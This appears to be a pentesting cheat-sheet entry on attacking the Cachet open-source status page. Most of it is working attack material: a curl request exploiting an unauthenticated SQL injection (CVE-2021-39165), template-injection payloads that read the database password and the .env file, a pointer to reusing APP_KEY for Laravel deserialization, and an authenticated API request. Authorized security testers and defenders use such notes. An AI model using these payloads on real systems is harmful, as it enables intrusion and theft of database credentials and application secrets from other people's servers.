# Cachet Status Page — Config Credential Leak + SQLi

Cachet (open-source status page) stores DB credentials in `.env`. CVE-2021-39172 allows authenticated SSTI. CVE-2021-39165 allows unauthenticated SQLi.

```bash
# CVE-2021-39165: Unauthenticated SQLi via search parameter
curl -s 'http://<TARGET>/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+1=1'

# Read .env via SSTI (after auth)
# In "Subscribers" name field or template: {{ config('database.password') }}
# or {{ file_get_contents('/var/www/html/.env') }}

# .env typically contains:
# DB_PASSWORD=...
# APP_KEY=base64:...  (use for Laravel deserialization)

# Also check API token in HTTP header for authenticated endpoints:
curl -s http://<TARGET>/api/v1/users -H 'X-Cachet-Token: <API_KEY>'
```
